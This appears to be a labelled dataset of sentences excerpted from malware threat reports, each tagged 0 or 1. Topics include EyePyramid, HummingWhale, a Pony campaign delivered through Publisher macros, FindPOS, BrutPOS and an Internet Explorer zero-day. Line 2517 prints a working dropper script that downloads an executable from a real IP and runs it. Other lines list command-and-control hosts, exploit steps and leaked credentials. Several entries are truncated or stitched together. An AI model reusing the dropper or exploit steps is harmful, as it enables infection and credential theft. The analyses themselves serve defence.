2410	Code targeting PST files Skype data The following queries, found in the partially-decompiled source code of one of the EyePyramid malware samples (i.e., those variants commonly named as vmgr.exe), show that it is trying to read from the Accounts, Contacts, Messages, and SMS tables of the Skype client, which contains the information of the said application.	1
2411	Figure 9.	0
2412	Code targeting Skype Disabling of security software EyePyramid targets various security tools and tries to disable both real-time protection mechanisms and AV-related processes from being launched, as can be seen from the following list: Figures 10-12.	0
2413	Code targeting security software Obfuscation and protection The malware binary is obfuscated by three tools: Skater + Dotfuscator, or ConfuserEx.	1
2414	As a result, the final executable is mildly protected from naïve debugging and in-VM dynamic analysis.	0
2415	However, the amount of protection provided is relatively mild and far from advanced.	0
2416	In addition, custom string-encryption/obfuscation is used to render strings non-directly readable on the decompiled source code.	0
2417	In particular, most of the samples using Skater + Dotfuscator encrypt the strings using 3DES, after serialization, reducing then to bytes arrays.	0
2418	We reverse-engineered the encryption routine and recovered the encrypted strings.	0
2419	Anecdotes and Other Curious Findings Cross-site Scripting Testing on HTML Emails?	0
2420	Although used for debugging only, we found that the malware author was playing around with email-based cross-site scripting, as can be seen from the following code snippet (from 21b6f2584485b8bbfffdefd45c1c72dc2133290fd8cefb235eb39cf015550316): Figure 13.	1
2421	Code testing Cross-site Scripting Provenance of email accounts During our analysis, we received emails from various analysts asking for clarification.	0
2422	One reader noted that the email address used by the EyePyramid operators to send spear-phishing messages was also used to register accounts on various dating sites, based on information from Leaked Source (a database of breaches from various sites).	0
2423	Searching on Leaked Source for the domains appearing on the court order—ones that were allegedly involved with the data-exfiltration activities—revealed a similar situation.	0
2424	Email addresses on these domains used to register on various sites, including dating and social media sites, were from various data breaches.	0
2425	As a result, these credentials, unless changed by the legitimate owners, are to be considered essentially publicly available.	0
2426	Icons Although not a detection criterion, the samples that we processed had 81 distinct icon types, some of which are shown below: Figure 14.	0
2427	Icons used by EyePyramid samples Analysis Methodology Figure 15.	0
2428	Analysis process We followed a fairly common practice for our analysis.	0
2429	As mentioned in our first blog post, it all started from a court order that appeared on the AGI site.	0
2430	From that, we extracted some patterns, which we used to perform what is commonly referred to as “retro-hunting,” that is, we wrote a Yara rule, plus some custom post-processing scripts, to statically match an initial set of patterns.	0
2431	This allowed us to get to a set of samples, among which was “d3ad32bcb255e56cd2a768b3cbf6bafda88233288fc6650d0dfa3810be75f74c”.	1
2432	Other analysts found that this was related to EyePyramid as well.	0
2433	We then manually deobfuscated and decompiled the binary code, obtaining a non-compiling source code tree, which allowed us to find more details about the malware’s behavior.	0
2434	Some of these behaviors were also confirmed after running the initial samples in a sandboxed environment (among which we used our Deep Discovery Analyzer).	0
2435	The newly extracted details allowed us to refine our retro-hunting process, revealing more samples, some of which are currently being manually analyzed.	0
2436	Among the various patterns that we used (e.g., included library names, domain names, email addresses), we note that the executable’s original name ensures a good recall.	0
2437	This is unusual, and possibly tells something about the attacker’s skills: A smart attacker would, at least, take care to randomize such names consistently in the PE header.	0
2438	With some automation, we run this iterative process every day and cross-check our findings with the reports sent by our customers.	0
2439	Conclusions From a purely technical viewpoint, the origins of EyePyramid’s malware and its attribution remain unclear.	0
2440	While the license key registered to Giulio Occhionero’s name can be considered as strong evidence, it is unclear why a malware author would bother using (simple yet not so trivial) mechanisms to cover their traces (e.g., obfuscation, packing, encryption, disabling security tools), and then mistakenly embed the license key under his name in all of the main variants.	0
2441	Moreover, an analysis of the domain-to-IP historical data of the domain names listed in the court order reveals domains named “occhionero.com” and “occhionero.info,” which is again another oddity.	0
2442	From a technical viewpoint, it is certain that the original source code has gone through mild modifications.	0
2443	On the other hand, the computer(s) used to build the various versions over the years seem to be in line with the evolution of Microsoft developer tools (based on the progression of the compiler version) and software-protection tools (as seen on the recent substitution of Skater + Dotfuscator with the more powerful ConfuserEx).	0
2444	Here is the appendix containing further details about the samples we analyzed.	0

2447	A Whale of a Tale: HummingBad Returns | Check Point Software Blog Toggle navigation A Whale of a Tale: HummingBad Returns Check Point researchers have found a new variant of the HummingBad malware hidden in more than 20 apps on Google Play.	0
2448	The infected apps in this campaign were downloaded several million times by unsuspecting users.	0
2449	Check Point informed the Google Security team about the apps, which were then removed from Google Play.	0
2450	This new variant, dubbed ‘HummingWhale,’ includes new, cutting edge techniques that allow it to perform ad fraud better than ever before.	1
2451	HummingBad is a malware first discovered by Check Point on customer’s devices in February 2016.	0
2452	HummingBad stands out as an extremely sophisticated and well-developed malware, which employed a chain-attack tactic and a rootkit to gain full control over the infected device.	0
2453	Later, in July 2016 Check Point unraveled the entire infrastructure behind the malware’s activities and even managed to identify Yingmob, the group behind the campaign.	0
2454	The malware was spread through third-party app stores and affected over 10 million victims, rooting thousands of devices each day and generating at least $300,000 per month.	0
2455	HummingBad was so widespread that in the first half of 2016 it reached fourth place in ‘the most prevalent malware globally’ list, and dominated the mobile threat landscape with over 72% of attacks.	0
2456	It was probably only a matter of time before HummingBad evolved and made its way onto Google Play.	0
2457	HummingWhale malware first raised suspicions when Check Point researchers analyzed one of the apps.	0
2458	It registered several events on boot, such as TIME_TICK, SCREEN_OFF and INSTALL_REFERRER which was dubious in that context.	1
2459	Code similarity inspection revealed that this was only one app out of a series of apps with a common name structure – com.XXXXXXX.camera (e.g.	1
2460	com.bird.sky.whale.camera, com.color.rainbow.camera, com.fishing.when.orangecamera).	1
2461	All of the apps were uploaded under the names of fake Chinese developers.	0
2462	In addition to the camera family, researchers were able to identify 16 additional, distinct package names related to the same malware, some of which were also found on Google Play.	0
2463	However, the most suspicious property of these apps was a 1.3MB encrypted file called ‘assets/group.png’ – a suspiciously large file.	1
2464	Some later HummingBad samples disguised as an app called “file-explorer” had the exact same encrypted file with a similar size.	1
2465	The new samples of HummingWhale also match several other traits and identifiers seen in previous samples, such as registering to certain events and some identical strings in their code and certificates.	0
2466	In addition, we identified several new HummingBad samples which operate as the previous version did and begun to promote the new HummingWhale version as part of their activity.	0
2467	This new malware was also heavily packed and contained its main payload in the ‘group.png’ file, which is, in fact, an apk, meaning they can be run as executables.	1
2468	This .apk operates as a dropper, used to download and execute additional apps, similar to the tactics employed by previous versions of HummingBad.	0
2469	However, this dropper went much further.	0
2470	It uses an Android plugin called DroidPlugin, originally developed by Qihoo 360 to upload fraudulent apps on a virtual machine.	1
2471	First, the Command and Control server (C&C) provides fake ads and apps to the installed malware, which presents them to the user.	0
2472	Once the user tries to close the ad, the app, which was already downloaded by the malware, is uploaded to the virtual machine and run as if it is a real device.	0
2473	This action generates the fake referrer id, which the malware uses to generate revenues for the perpetrators.	0
2474	This method has several advantages: HummingWhale also conducted further malicious activities, like displaying illegitimate ads on a device, and hiding the original app after installation, a trait which was noticed by several users.	0
2475	As can be seen in the image below, HummingWhale also tries to raise its reputation in Google Play using fraudulent ratings and comments, similar to the Gooligan and CallJam malware before it.	0
2476	This is a prime example of malware developers learning from each other, as tactics that were introduced by one of them are quickly adopted by others.	0
2477	The fraudulent ratings left by such malware is another reminder that users cannot rely on Google Play for protection, and must apply further, more advanced means of security.	0

2480	Talos Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: When A Pony Walks Out Of A Pub Tuesday, February 7 2017 When A Pony Walks Out Of A Pub This blog was authored by Warren Mercer and Paul Rascagneres.	0
2481	Talos has observed a small email campaign leveraging the use of Microsoft Publisher files.	0
2482	These .pub files are normally used for the publishing of documents such as newsletters, allowing users to create such documents using familiar office functions such as mail merging.	0
2483	Unlike other applications within the Microsoft Office suite, Microsoft Publisher does not support a Protected View' mode.	0
2484	This is a read only mode which can help end users remain protected from malicious document files.	0
2485	Microsoft Publisher is included and installed by default in Office 365.	0
2486	The file used in this campaign was aimed at infecting the victim with the, well known, Pony malware.	0
2487	Whilst Pony is well documented in technical capability it has not been known to use the .pub file format until now.	0
2488	Pony is a credential harvesting piece of malware with other trojan capabilities.	0
2489	In addition to credential harvesting, it is also commonly deployed as a malware loader and used to infect systems with additional malware in multi-stage infection chains.	0
2490	Pony is still used heavily as the sources of multiple Pony versions leaked thus making it much easier for other malicious actors to implement Pony into their infection chain.	0
2491	The Pub This campaign was delivered using email attachments which is a very common method of infection for old and new malware.	0
2492	The difference here is the use of .pub files.	0
2493	"The attached file was delivered to the end user as ""skbmt_fax45.pub"" the attacker made no attempt to try to hide the file type."	1
2494	Frequently we see attackers hiding the TRUE file type within a .zip compressed file.	0
2495	However, the SKBMT' name can be misread as part of the SKMBT' prefix used by Konica Minolta scanner (SKMBT - Scan Konica Minolta Business Technologies).	0
2496	The file was a seemingly legitimate Microsoft Publisher file.	0
2497	In the email the attacker tries to entice the user to open the email by asking for services from the end user.	0
2498	In this instance claims referencing a financing requirement, and Chief Operating Officer' provide further enticement to the user that the sender is legitimate.	0
2499	The analysis begins with the .pub attachment.	0
2500	Upon execution the file appears to crash Microsoft Publisher and the user is presented with a timer showing that the file is currently being opened.	0
2501	Talos believe this freeze is due to the 2MB macro file being loaded during the opening of the .pub file.	0
2502	After a few moments the Publisher application appears to crash and starts to exhibit the Not Responding' message suggesting the application has crashed This message times out and Publisher will resume running - at this stage the user is presented with a blank Microsoft Publisher environment displaying a seemingly an empty file… of course avid malware hunters out there know anything that opens, crashes then becomes blank is normally an indication of something malicious going on in the background!	0
2503	At this stage it was time to start paying attention to the file as opposed to its immediate contents.	0
2504	We begin our analysis using OleDump and we are able to quickly identify a large 2MB+ macro existing within the malicious publisher file.	0
2505	We then turn to using OleVBA to continue our analysis on the file itself - as with many Office format based attacks the use of embedded macros is very common and we expected no less with this particular sample.	0
2506	Exploring the Macro contents led to the following, as seen in the IOC output from OleVBA, the letten.js' file... What we found was a macro which was used to write an object file a 430K~ letten.js' file onto disk.	1
2507	The macro achieved this by using a CreateObject' method and using multiple DumpFile' objects which slowly wrote the file to disk.	0
2508	The DumpFile objects are written to disk as follows... And eventually what is written is a malicious .js file which is heavily obfuscated.	0
2509	JS Obfuscation Now we've identified the Pub file does indeed contain more than meets the eye we begin analysis on the embedded .js mentioned above.	0
2510	Initially we find a heavily obfuscated piece of Javascript -- remember this is the cool kids' language of choice now -- but we can easily overcome this obfuscation.	0
2511	The obfuscation is divided into 2 layers.	0
2512	The first layer decrypts data in order to perform an eval() on the clear text.	0
2513	Not surprisingly the eval reveals another layer of obfuscated Javascript!	0
2514	The second script is obfuscated too.	0
2515	The obfuscation mechanisms are mainly based on string hiding.	0
2516	We identified 2 techniques used to perform this task: The second piece of JavaScript contains some odd code as there are portions of useless code in relation to an embedded image file, we were unable to identify any significant use for this code.	0
2517	"Once decrypted, we can easily identify the purpose of the 2nd piece of JavaScript: var ws=new ActiveXObject('WScript.Shell'); var fs=new ActiveXObject('Scripting.FileSystemObject'); var exe_path=fs[GetSpecialFolder](0x2)+'\\'+""kl.pub""; // %TEMP%\kl.pub var as=new ActiveXObject('ADODB.Stream'); as['Open'](); as['Type']=0x1; as['Position']=0x0; var http=new ActiveXObject('WinHTTP.WinHTTPRequest.5.1'); http['open'](),('http://5.200.52.198/flex/3435dde3r.exe',0x0); http['send'](); if(http['Status']==0xc8){ as['Write'](http['ResponseBody']); if(fs['FileExists'](exe_path)) fs['DeleteFile'](exe_path); as['SaveToFile'](exe_path); as['Close']; if(!fs['FileExists'](exe_path)) fs['DeleteFile'](exe_path); var command='cmd.exe /c'+exe_path; ws['Run'](command,0x0) } The purpose is to download a binary from hxxp://5.200.52.198/flex/3435dde3r.exe, to the users TEMP folder, rename the downloaded file to kl.pub and finally execute the malicious binary."	1
2518	Payload Upon completion of our analysis we identified the malware payload as Pony.	0
2519	Pony is not a new piece of malware and is well documented and well understood by the security community.	0
2520	Pony is mainly used for password stealing and credential harvesting.	0
2521	The use of the .pub file as a delivery mechanism and the obfuscated Javascript was the new features within this Pony campaign.	0
2522	A small point of note was this campaign was relatively unsuccessful in terms of outbound connectivity.	0
2523	Using Cisco Umbrella we were able to identify a low number of connections to the C2 infrastructure.	0
2524	Conclusion The article demonstrates how cyber-criminal use standard Macros in the Office Publisher application associated with multi-layer obfuscated JavaScript to install malware on systems.	0
2525	We strongly recommend never to open unknown documents or anything from an unknown sender/source.	0
2526	In addition, Microsoft Windows allows Windows Script Host to be disabled by creating the registry key (REG_DWORD): HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\Enabled with the value set to 0' To disable WSH for all users of a particular computer, create this entry: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Script Host\Settings\Enabled More information about disabling WSH execution can be found on the Microsoft website.	0

2550	Showing results for Search instead for Do you mean Blog Options FINDPOS: New POS Malware Family Discovered by arsimon on ‎03-25-2015 10:05 PM - last edited on ‎05-09-2017 5:32 PM by editeur (25,904 Views) This is article was originally posted by Unit 42 author, Josh Grunzweig.	0
2551	Unit 42 has discovered a new Point of Sale (POS) malware family, which includes multiple variants created as early as November 2014.	0
2552	Over the past few weeks we have been analyzing this malware family, which we have dubbed ‘FindPOS’ due to strings consistently found in each variant.	0
2553	While this malware doesn’t show strong sophistication, the large number of variants shows prevalence similar to families such as Alina and Backoff.	0
2554	It is clear that FindPOS should be considered a strong threat to Microsoft Windows POS vendors, and measures should be taken to ensure protection.	0
2555	Workflow The malware in question has the ability to scrape memory for track data, exfiltrate any discovered data via HTTP POST requests, and in some instances log keystrokes.	0
2556	While the malware family uses many common techniques witnessed in previous malware families targeting POS devices, the prevalence and continued development of this malware demonstrates a threat to those running Windows-based point of sale terminals.	0
2557	The general workflow of the FindPOS malware family can be seen below.	0
2558	Evolution Over the course of our research, a total of nine variants of FindPOS have been discovered.	0
2559	Using compile timestamp information, we can see a timeline of these variants below.	0
2560	A breakdown of the specific functionality changes between versions is as follows: Version 2.1 Version 5.57 Version 5.80 Version 5.90 Version 6.0 Version 6.02 Version 6.03 Version 6.04 As we can see from the above timeline, FindPOS appears to have been very actively developed early on, while over time the author made minimal changes.	0
2561	These minimal changes were likely made for performance reasons or potentially bug fixes.	0
2562	Installation Upon execution, FindPOS will generate a lowercase alphabetic executable name of eight characters (example: abodeign.exe).	1
2563	This name is generated using the following system information: Using these values in order to generate results in a consistently generated name when run on the same machine.	0
2564	Please note that the hashing algorithm used was modified in version 2.1.	0
2565	Please refer to the ‘Evolution’ section above for details.	0
2566	This executable name is then compared against the original executable name of the running malware.	0
2567	Should those names not match, the malware will proceed to continue with its installation routine.	0
2568	FindPOS proceeds to copy itself to the following directories using the executable name that was previously generated: Should these file copy operations prove successful, the malware will write the following registry keys: The malware will proceed to spawn a new instance of %SystemRoot%\System32\[name].exe via a call to CreateProcessA.	1
2569	Should this prove successful, the malware will execute the following command prior to exiting.	0
2570	This command is responsible for deleting the original executable.	1
2571	cmd.exe /c del [original_executable_path] >> NUL Should the CreateProcessA call on %SystemRoot%\System32\[name].exe fail, FindPOS will attempt to spawn a new instance of %USERPROFILE%\[name].exe.	1
2572	If this proves successful, FindPOS will attempt to delete the original executable using the same technique previously seen.	0
2573	After installation of FindPOS is successful, the malware will create a global mutex in order to ensure only one instance of FindPOS is running.	0
2574	This mutex has the following name: Where [hex] is a series of 16 uppercase hexadecimal characters that are generated using the same technique witnessed when generating the malware’s executable name during the installation routine.	1
2575	After this mutex is successfully created, FindPOS will continue to scrape memory and optionally log keystrokes.	0
2576	Memory Scraping Memory scraping is a technique found in the majority of POS malware families discovered in prior years.	0
2577	The concept is fairly simple: read the memory of running processes on a POS terminal, and look for track data.	0
2578	When a card is swiped on a POS terminal, and the transaction is processed, the card data will often reside in memory unencrypted for a brief period of time.	0
2579	Attackers exploit this weakness in order to find track data.	0
2580	A common technique for increasing performance of memory scrapers is to blacklist a list of commonly seen process names, such as explorer.exe, lsass.exe, csrss.exe, etc.	1
2581	Alternatively, some malware families leverage a whitelist approach, where only specific process names are targeted.	0
2582	FindPOS, however, uses a brand new approach.	0
2583	This particular family determines the owner of every process on the system, via calls to EnumProcesses, OpenProcess, GetTokenInformation and LookupAccountSid.	1
2584	The owner of the process is then compared against the ‘NT AUTHORITY’ string.	0
2585	This filters out any processes not being run as system or as a service.	0
2586	In the example below, all processes except for ‘dwm.exe’ and the multiple instances of ‘conhost.exe’ would be filtered.	1
2587	Figure 1.	0
2588	Example Running Processes In the event a process is not filtered, memory is scraped via calls to VirtualQueryEx and ReadProcessMemory.	0
2589	This is a very common approach that is witnessed in almost all memory scrapers.	0
2590	Once the data is read, FindPOS proceeds to look for track data.	0
2591	Starting with version 5.57, the author began making checks based on various data found within the track data.	0
2592	For example, in version 5.57 the author began ignoring any track data that did not have an expiration date between January 2014 to December 2030.	0
2593	This helped to ensure expired card data was not captured.	0
2594	Additionally, the author paid close attention to the service codes that appeared within any discovered track data.	0
2595	The service code is a three-digit number that represents the type of card being swiped.	0
2596	In this particular instance, the author chose to only capture cards that held the following options: First Digit – ‘International interexchange OK’ or ‘International interchange, use IC (chip) where feasible’ Second Digit – ‘Normal’ Third Digit – ‘No restrictions’ By adding these restrictions, the author was able to ignore cards that it did not consider to be appealing.	0
2597	Such cards included gift cards, debit cards, and test cards to name a few.	0
2598	Any discovered track data is stored in memory until exfiltration occurs.	0
2599	This data is exfiltrated via the ‘data’ POST parameter.	0
2600	Keylogging Starting in version 5.90, the author of FindPOS began adding keylogging to this family.	0
2601	Many magnetic card readers often will emulate a keyboard device.	0
2602	Knowing this, many POS malware authors incorporate this functionality into their families.	0
2603	In addition to collecting track data, keylogging also has the ability to potentially collect usernames, passwords, or other sensitive data on the victim machine.	0
2604	In order to accomplish this, the author spawns a new thread that is responsible for keylogging.	0
2605	A common technique of creating a new empty window, registering itself as a raw input device, and making calls to the GetRawInputData API is used.	0
2606	Any keystrokes are stored in memory until exfiltration occurs.	0
2607	The keystrokes are exfiltrated via the ‘logs’ POST parameter.	0
2608	Exfiltration Exfiltration for FindPOS takes place via HTTP POST requests.	0
2609	A number of hardcoded domains are configured for each sample, often varying between FindPOS variants.	0
2610	HTTP POST requests are made every 120 seconds (2 minutes).	0
2611	In the event any data has been discovered, such as track data or keystroke data, this data is included.	0
2612	An example request from version 5.80 is shown below: As we can see, a number of POST variables are included in each request: An example of decoding the ‘uinfo’ parameter can be seen below: >>> import base64 >>> base64.b64decode(“Sk9TSC1QQyBAIGpvc2gtUENcam9zaA==”) ‘JOSH-PC @ josh-PC\\josh’ Keystroke data and track data is obfuscated using a combination of Base64 encoding and a single-byte XOR encryption.	1
2613	Decoding this data can be seen below: >>> import base64 >>> raw #ERROR!	0
2614	“” >>> for s in base64.b64decode(“HxkaGxgfGhodGhoaGhsTGxcbHxoSGxobGhMbGBkeHxwdEhMaGxU=”): >>> raw += chr(ord(s) ^ 0x2a) >>> print raw 5301250070000191=15081010912345678901?	1
2615	In addition to data exfiltration, FindPOS added the ability to download/execute further malware.	0
2616	Upon sending an exfiltration request, should the server respond with a 0x1 or 0x4 byte, followed by a URL, this file will be downloaded and subsequently executed.	0
2617	The file is downloaded to a temporary folder, with the file itself prefixed by ‘BN’.	0
2618	This downloaded file is executed via a call to CreateProcessA.	0
2619	In the event the file cannot be properly downloaded or executed, it is deleted from disk.	0
2620	Domain/IP Address Information A total of 37 domains were discovered while researching the FindPOS malware family.	0
2621	Of these domains, 13 unique IP addresses were discovered.	0
2622	The geographic location of these IP addresses can be seen below.	0
2623	Please refer to the Appendix for a full list of all domains.	0
2624	The majority of the domains discovered were configured with the following WHOIS information.	0
2625	Registrant Name: Julio Quinlan Registrant Organization: nan Registrant Street: 4516 Glory Road Registrant City: Nashville Registrant State/Province: TN Registrant Postal Code: 37204 Registrant Country: us Registrant Phone: +01.9318135965 Registrant Phone Ext: Registrant Fax: +01.9318135965 Registrant Fax Ext: Registrant Email: barkmanueta@rambler.ru Please note that the registrant email was slightly different depending on the domain queried.	0
2626	While the information above appears legitimate, it was discovered to be falsified.	0
2627	Related Samples – Keylogging/LogMeIn Recon During the course of our research, a number of similar samples were discovered.	0
2628	One such sample can be seen below.	0
2629	Version 8.3 – LogMeIn Recon / Keylogger This particular sample is responsible for collecting LogMeIn account information, logging keystrokes and mouse-clicks, and periodically exfiltrating this data to a remote server.	0
2630	This sample shares a number of characteristics with the FindPOS samples previously discovered.	0
2631	Some of these similarities include the installation process, URI scheme, format of the HTTP POST requests, and the PDB string.	0
2632	Upon execution, this malware will install itself in the same method as FindPOS.	0
2633	Additionally, a mutex is created using the technique previously mentioned.	0
2634	The malware will attempt determine if LogMeIn Ignition is installed on the victim machine by checking the following registry keys: HKCU\Software\LogMeIn Ignition\[Variable Hash]\Account : Email Any discovered emails are exfiltrated using the same HTTP POST requests witnessed in FindPOS.	1
2635	However, instead of using the ‘data’ POST parameter, this particular sample uses the ‘logs’ parameter.	0
2636	This can be seen below: The malware proceeds to log keystrokes and mouse clicks.	0
2637	This data is exfiltrated every two minutes.	0
2638	While this sample certainly could have been used to scrape track data from POS terminals that have card readers that emulate keyboard devices, I suspect this sample was more likely used to gain access to more POS machines.	0
2639	It is most likely that this sample was dropped on a machine that was administering multiple POS machines, and the information obtained from this particular box was leveraged to gain access to said POS machines.	0
2640	It’s also interesting to note that the compile timestamp for this particular sample lines up to just about two weeks after the introduction of keylogging functionality (starting in version 5.90).	0
2641	It would appear that right around this time the malware author added a new trick to his or her repertoire.	0
2642	Conclusion Overall, FindPOS isn’t terribly sophisticated.	0
2643	It lacks a number of features that we’ve seen in previous malware families, such as a more sophisticated command and control structure, stronger encryption, and performing luhn checks on any discovered data.	0
2644	Additionally, the evolution of this family provides interesting clues to the notion that this malware was written from scratch.	0
2645	While FindPOS may share minimal similarities with previously witnessed malware families, we are strongly confident that this malware is a brand new family.	0
2646	While this malware doesn’t show strong sophistication, the large number of variants shows prevalence similar to families such as Alina and Backoff.	0
2647	It is clear that FindPOS should be considered a strong threat to Microsoft Windows POS vendors, and measures should be taken to ensure protection.	0
2648	Such measures include, but are not limited to, configuring two-factor authentication for any remote access services (LogMeIn, VNC, RDP, etc.	0
2649	), ensuring anti-virus is installed and updated, and ensuring POS devices are not used non-approved functions, such as browsing the web or checking email.	0
2650	Palo Alto Networks customers are protected by WildFire, which automatically classifies FindPOS samples as malware.	0
2651	Additionally, the indicators we’ve discovered that are related to these attacks have been added to PANDB and Anti-Malware protection systems.	0

2701	Clever little fakes To date, we have seen two versions of the trojan: The first version (com.baidu.com), disguises itself as a mobile client for the Chinese search engine Baidu, simply opening a URL http://m.baidu.com inside the application.	1
2702	The second version is a well-made fake version of a popular Chinese app (http://www.coolapk.com/apk/com.snda.wifilocating) for sharing information about Wi-Fi networks (including the security password) between users of the app.	1
2703	The cybercriminals even created a website (though badly made) to advertise and distribute the aforementioned fake version of com.snda.wifilocating.	1
2704	The first, st07383.en17.docx, continues by utilizing 32 or 64 bit versions of CVE-2017-0001 to escalate privileges before executing a final JavaScript payload containing a malware implant known as SHIRIME.	1

2710	Another example is the VideoFileDownload browser extension, but there may be many others.	1
2711	Another, lesser known feature of this extension is its ability to inject its ad scripts into online HTML editors, like TinyMCE (used by WordPress and Joomla!).	1
2712	"Mass Malvertising
As illustrated, the extension injected multiple third-party advertising scripts into the page."	1
2713	After unpacking the dropper we found a typical component for providing the next steps for   installation of the Rovnix bootkit’s BkSetup.dll module.	1
2714	"There is also a version information structure to be found in the resource section of BkSetup.dll filled as follows:
The file version has been changed to 2.4: previously, Carberp used version 2.1 of BkSetup.dll and stored the information in the debug string sent to the C&C as debugging information."	1
2715	These sectors are not used for general hidden storage, but only as a location for storing the malicious driver, which injects the payload into specified user-mode processes on the infected machine.	1
2716	A strange function call was detected with the ability to read the file INJECTS.SYS from hidden storage.	1
2717	For synchronization reasons the payload generates the mutex:   Global<Generated_string>.	1
2718	"Red Team could infect Windows EXE files
by remaining resident in the Windows memory."	1
2719	"Although the .vbs files can be used after they have been infected, each opened

attached to a command button."	1
2721	"The first security incident of the year was triggered by the Win95.Worm.Happy99.A virus (also known
as Ska, The antimalware industry is
still arguing whether Happy99 is a virus, a worm or a Trojan horse, because its

2722	These stolen files are stored in the $NtUninstallKB080515$ under the Windows folder.	1
2723	"CHINA WANTS YOUR APPLE ID & PASSWORDS
Soon after the jailbroken developer uncovered the mysteries ‘Unfold.dylib’ file and found that the infection targets jailbroken iOS handsets to captures Apple IDs and passwords from Internet sessions that use Secure Socket Layer (SSL) to encrypt communications and is believed to be spreading through the Chinese iOS software sites, according to the researchers at German security firm SektionEins."	1
2724	The messages arrive with a file attachment in .ZIP format, which the recipients must open to view the e-card.	1

Operation SnowMan: DeputyDog Actor Compromises US Veterans of Foreign
Wars Website
February 13, 2014
 | 
 by Darien Kindlund, Xiaobo Chen, Mike Scott, Dan Caselden, Ned Moran | Vulnerabilities, Threat Research, Targeted Attack, Exploits, Advanced Malware
On February 11, FireEye identified a zero-day exploit (CVE-2014-0322)  being served up from the U.S. Veterans of Foreign Wars’ website (vfw[.]org)."	1
2727	The exploit includes calling back to the IE 10 vulnerability trigger, which is embedded in the JavaScript.	1
2728	"Mitigation
The exploit targets IE 10 with Adobe Flash."	1
2729	The beginning of the file is a JPG image; the end of the file (offset 36321) is the payload, encoded with an XOR key of 0x95.	1
2730	Then, when the shellcode is executed, the malware creates files “sqlrenew.txt” and “stream.exe”.	1
2731	“sqlrenew.txt” is then executed with the LoadLibraryA Windows API call.	1
2732	The compile date of the payload was 2014-02-11, and the last modified date of the exploit code was also 2014-02-11.	1
2733	This particular variant called back to a command and control server located at newss[.]effers[.]com.	1
2734	We also observed another “HTTPS” Gh0st variant connecting to a related command and control server at me[.]scieron[.]com.	1
2735	]org domain also resolved to another IP in the same subnet 58.64.199.0/24.	1
2736	If the infected system is able to successfully brute force an RDP server, it reports back with credentials.	1
2737	Three of these servers are located on the same network in Russia; one of them is located in Iran.	1

2740	It has two distinct code paths depending on its ability to get debug permissions by calling RtlAdjustPrivilage(0x14,1,0…).	1
2741	"If it succeeds in getting debug permissions, it downloads the executable and executes it:

Accept-Encoding: gzip
Connection: Keep-Alive
Accept-Language: ru-RU,en,*
User-Agent: Browser
Host: 82.146.34.22
 
If the malware fails to get debug permissions, it copies itself to %WINDIR%\lsass.exe and installs itself as a service."	1
2742	Candidates are verified using the Luhn checksum and saved to winsrv.sys.	1
2743	Before connecting to the FTP server, the implant connects to smtp[.]gmail[.	1
2744	winsrv.sys is uploaded to the FTP serving using a filename consisting of a capital character followed by the IP address.	1
2745	Two of the IP addresses were from PEOPLE-NET, an ISP in Ukraine.	1
2746	"However, the “User-Agent” in this case was FireFox:
""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0""
There were also connections from an IP range in Russia assigned to the network “Macroregional_South” in Volvograd."	1
2747	We saw the attackers connect to the RDP instance 27 minutes after the fake username and password combination were sent to the C2.	1
2748	The BrutPOS malware was initially identified in March 2014 but the full scope of the botnet was still unknown at that time.	1

2796	"The attacker uses the vulnerability to do the following:
EMET detection
The attacker uses the Microsoft.XMLDOM ActiveX control to load a one-line XML string containing a file path to the EMET DLL."	1
2797	For example, the attacker corrupts a Flash Vector object and then accesses the corrupted object from within Flash to access memory.	1
2798	The attacker then overwrites the vftable pointer of a flash.Media.Sound() object in memory to point to the pivot and begin ROP.	1
2799	The attacker appends the payload to the shellcode before pivoting to code control.	1

2833	The Trojan Monkif makes a number of different requests to the predefined servers to collect commands, and the server responds with JPEG images encapsulating the malicious commands inside.	1

2851	For reference, the original Cmstar downloader malware samples were compiled in February 2015.	1

2857	The malicious web page that is loaded by the IFRAME downloads several files, namely a bitmap file, a couple of javascript files and a pair of HTML files.	1
2858	These files in turn download a malicious executable file, SYSDOWN.EXE, which is detected by Trend as TSPY_DELF.GMN.	1

2861	The user account “Best1_user” and password “BackupU$r” were used to log in to the shared drive (indicated by the “S:” under the “Resource Type” heading in the image above.	1
2862	“In the previous listing showing the data’s move to an internal server, 10.116.240.31 is the intermediate server selected by attackers, and CTU researchers believe the “ttcopscli3acs” string is the Windows domain name used on Target’s network.	1
2863	The executable name “bladelogic.exe” does not exist in any piece of legitimate BMC software.	1

2869	More recently, a very sophisticated FAKEAV variant detected as TROJ_FAKEAV.KAX was found.	1
2870	The exploit kit is loaded through a simple IFRAME that is added near the end of the HTML document; for example hXXp://defenceiq.us/2rfKZL_BGwEQ in the screenshot below.	1
2871	The domain defenceiq.us was found to resolve to 76.73.47.90.	1
2872	Based on this information, the exploit kit redirects the browser either to another URL containing an exploit, or to http://localhost.	1
2873	"Payload

2877	However, in version 1.7, BetaBot uses another layer of encryption located at VA 004476F3.	1
2878	For this walkthrough, Explorer.exe is used.	1
2879	The base functionality of BkSetup.dll is centred on the process of infection and setting up the hidden storage partition.	1
2880	This curious function extracts one or two paths from the file INJECTS.SYS to files on the standard file system.	1
2881	"The series of threats continued with PP97M.Shaper.A
and PP97M.Master.A, two
different viruses that probably belong to the same author."	1
2882	"Called the O97M.Corner.A, the new virus would set the Office 2000 security
settings to low (The virus was unable to infect Word 200 files unless it
successfully changed the security levels to “low”), disable the
“Tools/Macros” menu and turn off the macro virus protection before
infecting all the opened files."	1
2883	Dubbed as “Bkdr_Tengo.A,” passes itself off as a legitimate system DLL file called winmm.dll.	1
2884	Detected by Trend Micro as TROJ_QHOST.GC, this Trojan modifies a computer’s HOSTS file to prevent users from connecting to page2.googlesyndication.co.	1

2889	The Javascript from the landing page contains the base64-encoded shellcode which is read in by the ActionScript.	1
2890	The ZIP file contains an EXE (a program file); that program file is one of the many variants of the Zbot malware, also known as Zeus, that we see on a regular basis.	1
2891	One of them is a *.bmp file and the other a *.scr file.	1

2894	Figure 6 depicts how a malicious URL could be shortened using this service.Figure 4 Single Byte XOR Key 0xF1Figure 5 URLDownloadToFileAFigure 6 URL Shortening ServiceFrom the network traffic, it is obvious that the real malicious content is located at hxxp://symbisecure.com/update/winword.pkg (see Figure 7).	1
